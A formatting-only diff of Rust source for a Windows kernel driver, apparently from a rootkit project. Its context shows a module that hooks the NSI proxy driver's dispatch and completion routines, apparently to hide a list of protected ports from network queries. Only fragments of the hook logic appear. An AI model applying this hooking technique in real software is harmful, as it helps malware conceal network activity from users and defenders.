@@ -1,24 +1,18 @@
+use alloc::vec::Vec;
 use core::{
     ffi::c_void,
     mem::size_of,
     ptr::{copy, null_mut},
     slice::from_raw_parts_mut,
-    sync::atomic::{
-        AtomicBool, 
-        AtomicPtr, 
-        Ordering
-    },
+    sync::atomic::{AtomicBool, AtomicPtr, Ordering},
 };
 
-use alloc::vec::Vec;
-use spin::{lazy::Lazy, Mutex};
+use spin::{Mutex, lazy::Lazy};
 use wdk::println;
 use wdk_sys::{
-    *, _MODE::KernelMode,
-    ntddk::{
-        ExFreePool, 
-        ObfDereferenceObject, 
-    },
+    _MODE::KernelMode,
+    ntddk::{ExFreePool, ObfDereferenceObject},
+    *,
 };
 
 use common::{
@@ -26,11 +20,13 @@ use common::{
     structs::TargetPort,
 };
 use crate::{
-    data::*, Result,
+    Result,
+    data::*,
     error::ShadowError,
     utils::{
-        *, pool::PoolMemory, 
-        uni::str_to_unicode,
+        pool::PoolMemory, 
+        uni::str_to_unicode, 
+        *
     },
 };
 
@@ -50,7 +46,8 @@ pub static HOOK_INSTALLED: AtomicBool = AtomicBool::new(false);
 pub static PROTECTED_PORTS: Lazy<Mutex<Vec<TargetPort>>> =
     Lazy::new(|| Mutex::new(Vec::with_capacity(100)));
 
-/// Represents a Network structure used for hooking into the NSI proxy driver and intercepting network information.
+/// Represents a Network structure used for hooking into the NSI proxy driver 
+/// and intercepting network information.
 pub struct Network;
 
 impl Network {
@@ -167,8 +164,7 @@ impl Network {
     /// # Returns
     ///
     /// * The result of the original dispatch function, or `STATUS_UNSUCCESSFUL` if the hook fails.
-    unsafe extern "C" 
-    fn hook_nsi(device_object: *mut DEVICE_OBJECT, irp: *mut IRP) -> NTSTATUS {
+    unsafe extern "C" fn hook_nsi(device_object: *mut DEVICE_OBJECT, irp: *mut IRP) -> NTSTATUS {
         let stack = (*irp)
             .Tail
             .Overlay
@@ -184,7 +180,7 @@ impl Network {
                 size_of::<(PIO_COMPLETION_ROUTINE, *mut c_void)>() as u64,
                 "giud",
             );
-            
+
             if let Some(addr) = context {
                 let address = addr.ptr as *mut (PIO_COMPLETION_ROUTINE, *mut c_void);
                 (*address).0 = (*stack).CompletionRoutine;
@@ -221,8 +217,7 @@ impl Network {
     /// # Returns
     ///
     /// * Returns the result of the original completion routine, or `STATUS_SUCCESS` if processing was successful.
-    unsafe extern "C" 
-    fn irp_complete(
+    unsafe extern "C" fn irp_complete(
         device_object: *mut DEVICE_OBJECT,
         irp: *mut IRP,
         context: *mut c_void,
